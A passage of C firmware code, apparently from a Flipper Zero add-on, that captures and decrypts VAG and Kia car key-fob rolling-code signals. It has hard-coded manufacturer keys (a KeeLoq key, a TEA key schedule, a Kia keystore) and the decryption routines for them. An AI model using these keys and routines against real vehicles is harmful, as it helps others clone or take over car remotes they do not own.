    .te_delta = 80,
    .min_count_bit_for_found = 80,
};

#define VAG_T12_TE_SHORT     300u
#define VAG_T12_TE_LONG      600u
#define VAG_T12_TE_DELTA     100u
#define VAG_T12_GAP_DELTA    200u
#define VAG_T12_PREAMBLE_MIN 151u

#define VAG_T34_TE_SHORT     500u
#define VAG_T34_TE_LONG      1000u
#define VAG_T34_TE_DELTA     100u
#define VAG_T34_LONG_DELTA   200u
#define VAG_T34_SYNC         750u
#define VAG_T34_SYNC_DELTA   150u
#define VAG_T34_PREAMBLE_MIN 31u
#define VAG_T34_SYNC_PAIRS   3u

#define VAG_DATA_GAP_MIN    4001u
#define VAG_TOTAL_BITS      80u
#define VAG_KEY1_BITS       64u
#define VAG_PREFIX_BITS     15u
#define VAG_BIT_LIMIT       96u
#define VAG_FRAME_PREFIX_T1 0x2F3Fu
#define VAG_FRAME_PREFIX_T2 0x2F1Cu

#define VAG_TEA_DELTA  0x9E3779B9U
#define VAG_TEA_ROUNDS 32

static const uint32_t vag_tea_key_schedule[] = {0x0B46502D, 0x5E253718, 0x2BF93A19, 0x622C1206};

// --- Decoder instance ------------------------------------------------------
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint32_t data_low;
    uint32_t data_high;
    uint8_t bit_count;
    uint32_t key1_low;
    uint32_t key1_high;
    uint32_t key2_low;
    uint32_t key2_high;
    uint16_t data_count_bit;
    uint8_t vag_type;
    uint16_t header_count;
    uint8_t mid_count;
    ManchesterState manchester_state;

    uint32_t serial;
    uint32_t cnt;
    uint8_t btn;
    uint8_t btn_flags;
    uint8_t check_byte;
    uint8_t key_idx;
    bool decrypted;

    uint32_t last_valid_serial;
    uint32_t last_valid_cnt;
} PpDec_vag;

typedef enum {
    VAGDecoderStepReset = 0,
    VAGDecoderStepPreamble1 = 1,
    VAGDecoderStepData1 = 2,
    VAGDecoderStepPreamble2 = 3,
    VAGDecoderStepSync2A = 4,
    VAGDecoderStepSync2B = 5,
    VAGDecoderStepSync2C = 6,
    VAGDecoderStepData2 = 7,
} VAGDecoderStep;

// --- Decode-path helpers ---------------------------------------------------
static void vag_tea_decrypt(uint32_t* v0, uint32_t* v1, const uint32_t* key_schedule) {
    uint32_t sum = VAG_TEA_DELTA * VAG_TEA_ROUNDS;
    for(int i = 0; i < VAG_TEA_ROUNDS; i++) {
        *v1 -= (((*v0 << 4) ^ (*v0 >> 5)) + *v0) ^ (sum + key_schedule[(sum >> 11) & 3]);
        sum -= VAG_TEA_DELTA;
        *v0 -= (((*v1 << 4) ^ (*v1 >> 5)) + *v1) ^ (sum + key_schedule[sum & 3]);
    }
}

static bool vag_dispatch_type_1_2(uint8_t dispatch) {
    return (dispatch == 0x2A || dispatch == 0x1C || dispatch == 0x46);
}

static bool vag_dispatch_type_3_4(uint8_t dispatch) {
    return (dispatch == 0x2B || dispatch == 0x1D || dispatch == 0x47);
}

static bool vag_button_valid(const uint8_t* dec) {
    uint8_t dec_byte = dec[7];
    uint8_t dec_btn = (dec_byte >> 4) & 0xF;

    if(dec_btn == 1 || dec_btn == 2 || dec_btn == 4) {
        return true;
    }
    if(dec_byte == 0) {
        return true;
    }
    return false;
}

static bool vag_button_matches(const uint8_t* dec, uint8_t dispatch_byte) {
    uint8_t expected_btn = (dispatch_byte >> 4) & 0xF;
    uint8_t dec_btn = (dec[7] >> 4) & 0xF;

    if(dec_btn == expected_btn) {
        return true;
    }
    if(dec[7] == 0 && expected_btn == 2) {
        return true;
    }
    return false;
}

static void vag_fill_from_decrypted(
    PpDec_vag* instance,
    const uint8_t* dec,
    uint8_t dispatch_byte) {
    uint32_t serial_raw = (uint32_t)dec[0] | ((uint32_t)dec[1] << 8) | ((uint32_t)dec[2] << 16) |
                          ((uint32_t)dec[3] << 24);
    instance->serial = (serial_raw << 24) | ((serial_raw & 0xFF00) << 8) |
                       ((serial_raw >> 8) & 0xFF00) | (serial_raw >> 24);

    instance->cnt = (uint32_t)dec[4] | ((uint32_t)dec[5] << 8) | ((uint32_t)dec[6] << 16);

    instance->btn = (dec[7] >> 4) & 0xF;
    instance->btn_flags = dec[7] & 0x0F;
    instance->check_byte = dispatch_byte;
    instance->decrypted = true;
}

static bool vag_aut64_decrypt(uint8_t* block, int key_index) {
    struct aut64_key* key = protocol_vag_get_key(key_index + 1);
    if(!key) {
        return false;
    }
    aut64_decrypt(*key, block);
    return true;
}

static void vag_parse_data(PpDec_vag* instance) {
    furi_assert(instance);

    instance->decrypted = false;
    instance->serial = 0;
    instance->cnt = 0;
    instance->btn = 0;

    uint8_t dispatch_byte = (uint8_t)(instance->key2_low & 0xFF);
    uint8_t key2_high = (uint8_t)((instance->key2_low >> 8) & 0xFF);

    uint8_t key1_bytes[8];
    uint32_t key1_low = instance->key1_low;
    uint32_t key1_high = instance->key1_high;

    key1_bytes[0] = (uint8_t)(key1_high >> 24);
    key1_bytes[1] = (uint8_t)(key1_high >> 16);
    key1_bytes[2] = (uint8_t)(key1_high >> 8);
    key1_bytes[3] = (uint8_t)(key1_high);
    key1_bytes[4] = (uint8_t)(key1_low >> 24);
    key1_bytes[5] = (uint8_t)(key1_low >> 16);
    key1_bytes[6] = (uint8_t)(key1_low >> 8);
    key1_bytes[7] = (uint8_t)(key1_low);

    uint8_t block[8];
    block[0] = key1_bytes[1];
    block[1] = key1_bytes[2];
    block[2] = key1_bytes[3];
    block[3] = key1_bytes[4];
    block[4] = key1_bytes[5];
    block[5] = key1_bytes[6];
    block[6] = key1_bytes[7];
    block[7] = key2_high;

    switch(instance->vag_type) {
    case 1:
        if(!vag_dispatch_type_1_2(dispatch_byte)) {
            break;
        }
        {
            uint8_t block_copy[8];

            for(int key_idx = 0; key_idx < 3; key_idx++) {
                memcpy(block_copy, block, 8);
                if(!vag_aut64_decrypt(block_copy, key_idx)) {
                    continue;
                }

                if(vag_button_valid(block_copy)) {
                    instance->serial = ((uint32_t)block_copy[0] << 24) |
                                       ((uint32_t)block_copy[1] << 16) |
                                       ((uint32_t)block_copy[2] << 8) | (uint32_t)block_copy[3];
                    instance->cnt = (uint32_t)block_copy[4] | ((uint32_t)block_copy[5] << 8) |
                                    ((uint32_t)block_copy[6] << 16);

                    instance->btn = (block_copy[7] >> 4) & 0xF;
                    instance->btn_flags = block_copy[7] & 0x0F;
                    instance->check_byte = dispatch_byte;
                    instance->key_idx = key_idx;
                    instance->decrypted = true;
                    return;
                }
            }
        }
        break;

    case 2:
        if(!vag_dispatch_type_1_2(dispatch_byte)) {
            break;
        }
        {
            uint32_t v0_orig = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
                               ((uint32_t)block[2] << 8) | (uint32_t)block[3];
            uint32_t v1_orig = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
                               ((uint32_t)block[6] << 8) | (uint32_t)block[7];

            {
                uint32_t v0 = v0_orig;
                uint32_t v1 = v1_orig;

                vag_tea_decrypt(&v0, &v1, vag_tea_key_schedule);

                uint8_t tea_dec[8];
                tea_dec[0] = (uint8_t)(v0 >> 24);
                tea_dec[1] = (uint8_t)(v0 >> 16);
                tea_dec[2] = (uint8_t)(v0 >> 8);
                tea_dec[3] = (uint8_t)(v0);
                tea_dec[4] = (uint8_t)(v1 >> 24);
                tea_dec[5] = (uint8_t)(v1 >> 16);
                tea_dec[6] = (uint8_t)(v1 >> 8);
                tea_dec[7] = (uint8_t)(v1);

                if(!vag_button_matches(tea_dec, dispatch_byte)) {
                    break;
                }

                vag_fill_from_decrypted(instance, tea_dec, dispatch_byte);
                instance->key_idx = 0xFF;

                return;
            }
        }
        break;

    case 3: {
        uint8_t block_copy[8];

        memcpy(block_copy, block, 8);
        if(vag_aut64_decrypt(block_copy, 2) && vag_button_valid(block_copy)) {
            instance->vag_type = 4;
            instance->key_idx = 2;
            vag_fill_from_decrypted(instance, block_copy, dispatch_byte);
            return;
        }

        memcpy(block_copy, block, 8);
        if(vag_aut64_decrypt(block_copy, 1) && vag_button_valid(block_copy)) {
            instance->key_idx = 1;
            vag_fill_from_decrypted(instance, block_copy, dispatch_byte);
            return;
        }

        memcpy(block_copy, block, 8);
        if(vag_aut64_decrypt(block_copy, 0) && vag_button_valid(block_copy)) {
            instance->key_idx = 0;
            vag_fill_from_decrypted(instance, block_copy, dispatch_byte);
            return;
        }

    } break;

    case 4:
        if(!vag_dispatch_type_3_4(dispatch_byte)) {
            break;
        }
        {
            uint8_t block_copy[8];
            memcpy(block_copy, block, 8);

            if(!vag_aut64_decrypt(block_copy, 2)) {
                break;
            }
            if(!vag_button_matches(block_copy, dispatch_byte)) {
                break;
            }
            instance->key_idx = 2;
            vag_fill_from_decrypted(instance, block_copy, dispatch_byte);
        }
        return;

    default:
        break;
    }

    instance->decrypted = false;
    instance->serial = 0;
    instance->cnt = 0;
    instance->btn = 0;
    instance->btn_flags = 0;
    instance->check_byte = 0;
}

// --- Framework entry points ------------------------------------------------
static void* vag_alloc(void) {
    PpDec_vag* i = (PpDec_vag*)calloc(1, sizeof(PpDec_vag));
    if(!i) return NULL;
    i->generic.protocol_name = "VAG";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    i->key_idx = 0xFF;
    protocol_vag_load_keys();
    return i;
}

static void vag_reset(void* context) {
    PpDec_vag* instance = (PpDec_vag*)context;
    instance->decoder.parser_step = VAGDecoderStepReset;
    instance->decrypted = false;
    instance->serial = 0;
    instance->cnt = 0;
    instance->btn = 0;
    instance->btn_flags = 0;
    instance->check_byte = 0;
    instance->key_idx = 0xFF;
}

static void vag_feed(void* context, bool level, uint32_t duration) {
    PpDec_vag* instance = (PpDec_vag*)context;

    switch(instance->decoder.parser_step) {
    case VAGDecoderStepReset:
        if(!level) break;
        if(DURATION_DIFF(duration, VAG_T12_TE_SHORT) < VAG_T12_TE_DELTA) {
            instance->decoder.parser_step = VAGDecoderStepPreamble1;
        } else if(DURATION_DIFF(duration, VAG_T34_TE_SHORT) < VAG_T34_TE_DELTA) {
            instance->decoder.parser_step = VAGDecoderStepPreamble2;
        } else {
            break;
        }
        instance->data_low = 0;
        instance->data_high = 0;
        instance->header_count = 0;
        instance->mid_count = 0;
        instance->bit_count = 0;
        instance->vag_type = 0;
        instance->decoder.te_last = duration;
        manchester_advance(
            instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);
        break;

    case VAGDecoderStepPreamble1:
        if(level) break;
        if(DURATION_DIFF(duration, VAG_T12_TE_SHORT) < VAG_T12_TE_DELTA) {
            if(DURATION_DIFF(instance->decoder.te_last, VAG_T12_TE_SHORT) < VAG_T12_TE_DELTA) {
                instance->decoder.te_last = duration;
                instance->header_count++;
            } else {
                instance->decoder.parser_step = VAGDecoderStepReset;
            }
            break;
        }
        instance->decoder.parser_step = VAGDecoderStepReset;
        if(instance->header_count < VAG_T12_PREAMBLE_MIN) break;
        if(DURATION_DIFF(duration, VAG_T12_TE_LONG) >= VAG_T12_GAP_DELTA) break;
        if(DURATION_DIFF(instance->decoder.te_last, VAG_T12_TE_SHORT) >= VAG_T12_TE_DELTA) break;
        instance->decoder.parser_step = VAGDecoderStepData1;
        break;

    case VAGDecoderStepData1: {
        if(instance->bit_count >= VAG_BIT_LIMIT) {
            instance->decoder.parser_step = VAGDecoderStepReset;
            break;
        }

        bool bit_value = false;
        ManchesterEvent event = ManchesterEventReset;
        bool got_pulse = false;

        if(DURATION_DIFF(duration, VAG_T12_TE_SHORT) < VAG_T12_TE_DELTA) {
            event = level ? ManchesterEventShortLow : ManchesterEventShortHigh;
            got_pulse = true;
        } else if(
            duration > VAG_T12_TE_SHORT + VAG_T12_TE_DELTA &&
            DURATION_DIFF(duration, VAG_T12_TE_LONG) < VAG_T12_GAP_DELTA) {
            event = level ? ManchesterEventLongLow : ManchesterEventLongHigh;
            got_pulse = true;
        }

        if(got_pulse) {
            if(manchester_advance(
                   instance->manchester_state, event, &instance->manchester_state, &bit_value)) {
                uint32_t carry = (instance->data_low >> 31) & 1;
                instance->data_low = (instance->data_low << 1) | (bit_value ? 1 : 0);
                instance->data_high = (instance->data_high << 1) | carry;
                instance->bit_count++;

                if(instance->bit_count == VAG_PREFIX_BITS) {
                    if(instance->data_low == VAG_FRAME_PREFIX_T1 && instance->data_high == 0) {
                        instance->data_low = 0;
                        instance->data_high = 0;
                        instance->bit_count = 0;
                        instance->vag_type = 1;
                    } else if(instance->data_low == VAG_FRAME_PREFIX_T2 && instance->data_high == 0) {
                        instance->data_low = 0;
                        instance->data_high = 0;
                        instance->bit_count = 0;
                        instance->vag_type = 2;
                    }
                } else if(instance->bit_count == VAG_KEY1_BITS) {
                    instance->key1_low = ~instance->data_low;
                    instance->key1_high = ~instance->data_high;
                    instance->data_low = 0;
                    instance->data_high = 0;
                }
            }
            break;
        }

        if(level) break;
        if(duration < VAG_DATA_GAP_MIN) break;
        if(instance->bit_count == VAG_TOTAL_BITS) {
            instance->key2_low = (~instance->data_low) & 0xFFFF;
            instance->key2_high = 0;
            instance->data_count_bit = VAG_TOTAL_BITS;

            vag_parse_data(instance);

            if(instance->base.callback && instance->decrypted) {
                bool is_valid = true;
                if(instance->last_valid_serial != 0) {
                    if(instance->serial == instance->last_valid_serial) {
                        uint32_t cnt_diff = instance->cnt > instance->last_valid_cnt ?
                            instance->cnt - instance->last_valid_cnt :
                            instance->last_valid_cnt - instance->cnt;
                        if(cnt_diff > 100) {
                            is_valid = false;
                        }
                    }
                }
                if(is_valid) {
                    instance->last_valid_serial = instance->serial;
                    instance->last_valid_cnt = instance->cnt;
                    instance->base.callback(&instance->base, instance->base.context);
                }
            }
        }
        instance->data_low = 0;
        instance->data_high = 0;
        instance->bit_count = 0;
        instance->decoder.parser_step = VAGDecoderStepReset;
        break;
    }

    case VAGDecoderStepPreamble2:
        if(!level) {
            if(DURATION_DIFF(duration, VAG_T34_TE_SHORT) < VAG_T34_TE_DELTA &&
               DURATION_DIFF(instance->decoder.te_last, VAG_T34_TE_SHORT) < VAG_T34_TE_DELTA) {
                instance->decoder.te_last = duration;
                instance->header_count++;
            } else {
                instance->decoder.parser_step = VAGDecoderStepReset;
            }
            break;
        }
        if(instance->header_count < VAG_T34_PREAMBLE_MIN) break;
        if(DURATION_DIFF(duration, VAG_T34_TE_LONG) >= VAG_T34_LONG_DELTA) break;
        if(DURATION_DIFF(instance->decoder.te_last, VAG_T34_TE_SHORT) >= VAG_T34_TE_DELTA) break;
        instance->decoder.te_last = duration;
        instance->decoder.parser_step = VAGDecoderStepSync2A;
        break;

    case VAGDecoderStepSync2A:
        if(!level &&
           DURATION_DIFF(duration, VAG_T34_TE_SHORT) < VAG_T34_TE_DELTA &&
           DURATION_DIFF(instance->decoder.te_last, VAG_T34_TE_LONG) < VAG_T34_LONG_DELTA) {
            instance->decoder.te_last = duration;
            instance->decoder.parser_step = VAGDecoderStepSync2B;
        } else {
            instance->decoder.parser_step = VAGDecoderStepReset;
        }
        break;

    case VAGDecoderStepSync2B:
        if(level && DURATION_DIFF(duration, VAG_T34_SYNC) < VAG_T34_SYNC_DELTA) {
            instance->decoder.te_last = duration;
            instance->decoder.parser_step = VAGDecoderStepSync2C;
        } else {
            instance->decoder.parser_step = VAGDecoderStepReset;
        }
        break;

    case VAGDecoderStepSync2C:
        if(!level &&
           DURATION_DIFF(duration, VAG_T34_SYNC) < VAG_T34_SYNC_DELTA &&
           DURATION_DIFF(instance->decoder.te_last, VAG_T34_SYNC) < VAG_T34_SYNC_DELTA) {
            instance->mid_count++;
            instance->decoder.parser_step = VAGDecoderStepSync2B;
            if(instance->mid_count == VAG_T34_SYNC_PAIRS) {
                instance->data_low = 1;
                instance->data_high = 0;
                instance->bit_count = 1;
                manchester_advance(
                    instance->manchester_state,
                    ManchesterEventReset,
                    &instance->manchester_state,
                    NULL);
                instance->decoder.parser_step = VAGDecoderStepData2;
            }
        } else {
            instance->decoder.parser_step = VAGDecoderStepReset;
        }
        break;

    case VAGDecoderStepData2: {
        bool bit_value = false;
        ManchesterEvent event = ManchesterEventReset;
        bool got_pulse = false;

        if(DURATION_DIFF(duration, VAG_T34_TE_SHORT) < VAG_T34_TE_DELTA) {
            event = level ? ManchesterEventShortLow : ManchesterEventShortHigh;
            got_pulse = true;
        } else if(DURATION_DIFF(duration, VAG_T34_TE_LONG) < VAG_T34_LONG_DELTA) {
            event = level ? ManchesterEventLongLow : ManchesterEventLongHigh;
            got_pulse = true;
        }

        if(got_pulse) {
            if(manchester_advance(
                   instance->manchester_state, event, &instance->manchester_state, &bit_value)) {
                uint32_t carry = (instance->data_low >> 31) & 1;
                instance->data_low = (instance->data_low << 1) | (bit_value ? 1 : 0);
                instance->data_high = (instance->data_high << 1) | carry;
                instance->bit_count++;

                if(instance->bit_count == VAG_KEY1_BITS) {
                    instance->key1_low = instance->data_low;
                    instance->key1_high = instance->data_high;
                    instance->data_low = 0;
                    instance->data_high = 0;
                }
            }
        }

        if(instance->bit_count != VAG_TOTAL_BITS) break;
        instance->key2_low = instance->data_low & 0xFFFF;
        instance->key2_high = 0;
        instance->data_count_bit = VAG_TOTAL_BITS;
        instance->vag_type = 3;
        vag_parse_data(instance);
        if(instance->base.callback && instance->decrypted) {
            bool is_valid = true;
            if(instance->last_valid_serial != 0) {
                if(instance->serial == instance->last_valid_serial) {
                    uint32_t cnt_diff = instance->cnt > instance->last_valid_cnt ?
                        instance->cnt - instance->last_valid_cnt :
                        instance->last_valid_cnt - instance->cnt;
                    if(cnt_diff > 100) {
                        is_valid = false;
                    }
                }
            }
            if(is_valid) {
                instance->last_valid_serial = instance->serial;
                instance->last_valid_cnt = instance->cnt;
                instance->base.callback(&instance->base, instance->base.context);
            }
        }
        instance->data_low = 0;
        instance->data_high = 0;
        instance->bit_count = 0;
        instance->decoder.parser_step = VAGDecoderStepReset;
        break;
    }

    default:
        instance->decoder.parser_step = VAGDecoderStepReset;
        break;
    }
}

/* ---------------------------------------------------------------------------
 * Registry line:
 *   { "VAG", vag_alloc, vag_feed, vag_reset, nullptr },
 *
 * UNRESOLVED symbols: none
 * Keys: EMBEDDED (vag_keys_packed[3], AUT64 packed) — no keystore, no
 *       subghz_environment_* on the decode path. Confirmed self-contained.
 * ------------------------------------------------------------------------- */

/* ============================================================================
 * Kia V3/V4 — Flipper-ARF (GPL, clé embarquée)
 *
 * KeeLoq simple-learning rolling code. The manufacturer key (KIA_MF_KEY) and
 * the KeeLoq decrypt primitive are embedded in-source — no external keystore.
 * PWM-coded 68-bit frame, V4 = high-first, V3 = inverted (low-first) pairs.
 * ==========================================================================*/

/* --- KeeLoq simple-learning decrypt (keeloq_common.c, GPLv3) --------------
 * Ported ONCE here; reached from the Kia V3/V4 decode path only. Function name
 * kept verbatim (unique across the assembled fragment set). Helper macros are
 * given a kia_kl_ prefix and undef'd below to avoid any collision. */
#ifndef KEELOQ_NLF
#define KEELOQ_NLF 0x3A5C742E
#endif
#define kia_kl_bit(x, n) (((x) >> (n)) & 1)
#define kia_kl_g5(x, a, b, c, d, e)                                                            \
    (kia_kl_bit(x, a) + kia_kl_bit(x, b) * 2 + kia_kl_bit(x, c) * 4 + kia_kl_bit(x, d) * 8 +   \
     kia_kl_bit(x, e) * 16)

static uint32_t subghz_protocol_keeloq_common_decrypt(const uint32_t data, const uint64_t key) {
    uint32_t x = data, r;
    for(r = 0; r < 528; r++)
        x = (x << 1) ^ kia_kl_bit(x, 31) ^ kia_kl_bit(x, 15) ^
            (uint32_t)kia_kl_bit(key, (15 - r) & 63) ^
            kia_kl_bit(KEELOQ_NLF, kia_kl_g5(x, 0, 8, 19, 25, 30));
    return x;
}

#undef kia_kl_bit
#undef kia_kl_g5

#define KIA_MF_KEY 0xA8F5DFFC8DAA5CDBULL

static const SubGhzBlockConst kia_v3v4_const = {
    .te_short = 400,
    .te_long = 800,
    .te_delta = 150,
    .min_count_bit_for_found = 68,
};

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    uint16_t header_count;

    uint8_t raw_bits[32];
    uint16_t raw_bit_count;
    bool is_v3_sync;

    uint32_t encrypted;
    uint32_t decrypted;
    uint8_t crc;
    uint8_t version;
} PpDec_kia_v3v4;

typedef enum {
    KiaV3V4DecoderStepReset = 0,
    KiaV3V4DecoderStepCheckPreamble,
    KiaV3V4DecoderStepCollectRawBits,
} KiaV3V4DecoderStep;

static uint8_t kia_v3v4_reverse8(uint8_t byte) {
    byte = (byte & 0xF0) >> 4 | (byte & 0x0F) << 4;
    byte = (byte & 0xCC) >> 2 | (byte & 0x33) << 2;
    byte = (byte & 0xAA) >> 1 | (byte & 0x55) << 1;
    return byte;
}

static void kia_v3v4_add_raw_bit(PpDec_kia_v3v4* instance, bool bit) {
    if(instance->raw_bit_count < 256) {
        uint16_t byte_idx = instance->raw_bit_count / 8;
        uint8_t bit_idx = 7 - (instance->raw_bit_count % 8);
        if(bit) {
            instance->raw_bits[byte_idx] |= (1 << bit_idx);
        } else {
            instance->raw_bits[byte_idx] &= ~(1 << bit_idx);
        }
        instance->raw_bit_count++;
    }
}

static bool kia_v3v4_process_buffer(PpDec_kia_v3v4* instance) {
    if(instance->raw_bit_count < 68) {
        return false;
    }

    uint8_t* b = instance->raw_bits;

    if(instance->is_v3_sync) {
        uint16_t num_bytes = (instance->raw_bit_count + 7) / 8;
        for(uint16_t i = 0; i < num_bytes; i++) {
            b[i] = ~b[i];
        }
    }

    uint8_t crc = (b[8] >> 4) & 0x0F;

    uint32_t encrypted =
        ((uint32_t)kia_v3v4_reverse8(b[3]) << 24) | ((uint32_t)kia_v3v4_reverse8(b[2]) << 16) |
        ((uint32_t)kia_v3v4_reverse8(b[1]) << 8) | (uint32_t)kia_v3v4_reverse8(b[0]);

    uint32_t serial = ((uint32_t)kia_v3v4_reverse8(b[7] & 0xF0) << 24) |
                      ((uint32_t)kia_v3v4_reverse8(b[6]) << 16) |
                      ((uint32_t)kia_v3v4_reverse8(b[5]) << 8) | (uint32_t)kia_v3v4_reverse8(b[4]);

    uint8_t btn = (kia_v3v4_reverse8(b[7]) & 0xF0) >> 4;
    uint8_t our_serial_lsb = serial & 0xFF;

    uint32_t decrypted = subghz_protocol_keeloq_common_decrypt(encrypted, KIA_MF_KEY);
    uint8_t dec_btn = (decrypted >> 28) & 0x0F;
    uint8_t dec_serial_lsb = (decrypted >> 16) & 0xFF;

    if(dec_btn != btn || dec_serial_lsb != our_serial_lsb) {
        return false;
    }

    instance->encrypted = encrypted;
    instance->decrypted = decrypted;
    instance->crc = crc;
    instance->generic.serial = serial;
    instance->generic.btn = btn;
    instance->generic.cnt = decrypted & 0xFFFF;
    instance->version = instance->is_v3_sync ? 1 : 0;

    uint64_t key_data = ((uint64_t)b[0] << 56) | ((uint64_t)b[1] << 48) | ((uint64_t)b[2] << 40) |
                        ((uint64_t)b[3] << 32) | ((uint64_t)b[4] << 24) | ((uint64_t)b[5] << 16) |
                        ((uint64_t)b[6] << 8) | (uint64_t)b[7];
    instance->generic.data = key_data;
    instance->generic.data_count_bit = 68;

    return true;
}

static void* kia_v3v4_alloc(void) {
    PpDec_kia_v3v4* i = (PpDec_kia_v3v4*)calloc(1, sizeof(PpDec_kia_v3v4));
    if(!i) return NULL;
    i->generic.protocol_name = "Kia V3/V4";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void kia_v3v4_reset(void* context) {
    PpDec_kia_v3v4* instance = (PpDec_kia_v3v4*)context;
    instance->decoder.parser_step = KiaV3V4DecoderStepReset;
    instance->header_count = 0;
    instance->raw_bit_count = 0;
    instance->crc = 0;
    memset(instance->raw_bits, 0, sizeof(instance->raw_bits));
}

static void kia_v3v4_feed(void* context, bool level, uint32_t duration) {
    PpDec_kia_v3v4* instance = (PpDec_kia_v3v4*)context;

    switch(instance->decoder.parser_step) {
    case KiaV3V4DecoderStepReset:
        if(level && (DURATION_DIFF(duration, kia_v3v4_const.te_short) < kia_v3v4_const.te_delta)) {
            instance->decoder.parser_step = KiaV3V4DecoderStepCheckPreamble;
            instance->decoder.te_last = duration;
            instance->header_count = 1;
        }
        break;

    case KiaV3V4DecoderStepCheckPreamble:
        if(level) {
            if(DURATION_DIFF(duration, kia_v3v4_const.te_short) < kia_v3v4_const.te_delta) {
                instance->decoder.te_last = duration;
            } else if(duration > 1000 && duration < 1500) {
                if(instance->header_count >= 8) {
                    instance->decoder.parser_step = KiaV3V4DecoderStepCollectRawBits;
                    instance->raw_bit_count = 0;
                    instance->is_v3_sync = false;
                    memset(instance->raw_bits, 0, sizeof(instance->raw_bits));
                } else {
                    instance->decoder.parser_step = KiaV3V4DecoderStepReset;
                }
            } else {
                instance->decoder.parser_step = KiaV3V4DecoderStepReset;
            }
        } else {
            if(duration > 1000 && duration < 1500) {
                if(instance->header_count >= 8) {
                    instance->decoder.parser_step = KiaV3V4DecoderStepCollectRawBits;
                    instance->raw_bit_count = 0;
                    instance->is_v3_sync = true;
                    memset(instance->raw_bits, 0, sizeof(instance->raw_bits));
                } else {
                    instance->decoder.parser_step = KiaV3V4DecoderStepReset;
                }
            } else if(
                (DURATION_DIFF(duration, kia_v3v4_const.te_short) < kia_v3v4_const.te_delta) &&
                (DURATION_DIFF(instance->decoder.te_last, kia_v3v4_const.te_short) <
                 kia_v3v4_const.te_delta)) {
                instance->header_count++;
            } else if(duration > 1500) {
                instance->decoder.parser_step = KiaV3V4DecoderStepReset;
            }
        }
        break;

    case KiaV3V4DecoderStepCollectRawBits:
        if(level) {
            if(duration > 1000 && duration < 1500) {
                if(kia_v3v4_process_buffer(instance)) {
                    if(instance->base.callback)
                        instance->base.callback(&instance->base, instance->base.context);
                }
                instance->decoder.parser_step = KiaV3V4DecoderStepReset;
            } else if(
                DURATION_DIFF(duration, kia_v3v4_const.te_short) < kia_v3v4_const.te_delta) {
                kia_v3v4_add_raw_bit(instance, false);
            } else if(
                DURATION_DIFF(duration, kia_v3v4_const.te_long) < kia_v3v4_const.te_delta) {
                kia_v3v4_add_raw_bit(instance, true);
            } else {
                instance->decoder.parser_step = KiaV3V4DecoderStepReset;
            }
        } else {
            if(duration > 1000 && duration < 1500) {
                if(kia_v3v4_process_buffer(instance)) {
                    if(instance->base.callback)
                        instance->base.callback(&instance->base, instance->base.context);
                }
                instance->decoder.parser_step = KiaV3V4DecoderStepReset;
            } else if(duration > 1500) {
                if(kia_v3v4_process_buffer(instance)) {
                    if(instance->base.callback)
                        instance->base.callback(&instance->base, instance->base.context);
                }
                instance->decoder.parser_step = KiaV3V4DecoderStepReset;
            }
        }
        break;
    }
}

/* ============================================================================
 * Kia V5 — Flipper-ARF (GPL, clé embarquée)
 *
 * Manchester-coded 67-bit rolling frame. The keystore (kia_v5_keystore_bytes)
 * feeding the mixer decode is embedded in-source — no external keystore.
 * ==========================================================================*/

static const SubGhzBlockConst kia_v5_const = {
    .te_short = 400,
    .te_long = 800,
    .te_delta = 150,
    .min_count_bit_for_found = 67,
};

static const uint8_t kia_v5_keystore_bytes[] = {0x53, 0x54, 0x46, 0x52, 0x4b, 0x45, 0x30, 0x30};

static uint16_t kia_v5_mixer_decode(uint32_t encrypted) {
    uint8_t s0 = (encrypted & 0xFF);
    uint8_t s1 = (encrypted >> 8) & 0xFF;
    uint8_t s2 = (encrypted >> 16) & 0xFF;
    uint8_t s3 = (encrypted >> 24) & 0xFF;

    int round_index = 1;
    for(size_t i = 0; i < 18; i++) {
        uint8_t r = kia_v5_keystore_bytes[round_index] & 0xFF;
        int steps = 8;
        while(steps > 0) {
            uint8_t base;
            if((s3 & 0x40) == 0) {
                base = (s3 & 0x02) == 0 ? 0x74 : 0x2E;
            } else {
                base = (s3 & 0x02) == 0 ? 0x3A : 0x5C;
            }

            if(s2 & 0x08) {
                base = (((base >> 4) & 0x0F) | ((base & 0x0F) << 4)) & 0xFF;
            }
            if(s1 & 0x01) {
                base = ((base & 0x3F) << 2) & 0xFF;
            }
            if(s0 & 0x01) {
                base = (base << 1) & 0xFF;
            }

            uint8_t temp = (s3 ^ s1) & 0xFF;
            s3 = ((s3 & 0x7F) << 1) & 0xFF;
            if(s2 & 0x80) {
                s3 |= 0x01;
            }
            s2 = ((s2 & 0x7F) << 1) & 0xFF;
            if(s1 & 0x80) {
                s2 |= 0x01;
            }
            s1 = ((s1 & 0x7F) << 1) & 0xFF;
            if(s0 & 0x80) {
                s1 |= 0x01;
            }
            s0 = ((s0 & 0x7F) << 1) & 0xFF;

            uint8_t chk = (base ^ (r ^ temp)) & 0xFF;
            if(chk & 0x80) {
                s0 |= 0x01;
            }
            r = ((r & 0x7F) << 1) & 0xFF;
            steps--;
        }
        round_index = (round_index - 1) & 0x7;
    }
    return (s0 + (s1 << 8)) & 0xFFFF;
}

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    uint16_t header_count;

    ManchesterState manchester_state;
    uint64_t decoded_data;
    uint64_t saved_key;
    uint8_t bit_count;
    uint64_t yek;
    uint8_t crc;
} PpDec_kia_v5;

typedef enum {
    KiaV5DecoderStepReset = 0,
    KiaV5DecoderStepCheckPreamble,
    KiaV5DecoderStepData,
} KiaV5DecoderStep;

static void kia_v5_add_bit(PpDec_kia_v5* instance, bool bit) {
    instance->decoded_data = (instance->decoded_data << 1) | (bit ? 1 : 0);
    instance->bit_count++;
}

static void* kia_v5_alloc(void) {
    PpDec_kia_v5* i = (PpDec_kia_v5*)calloc(1, sizeof(PpDec_kia_v5));
    if(!i) return NULL;
    i->generic.protocol_name = "Kia V5";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    i->manchester_state = ManchesterStateMid1;
    return i;
}

static void kia_v5_reset(void* context) {
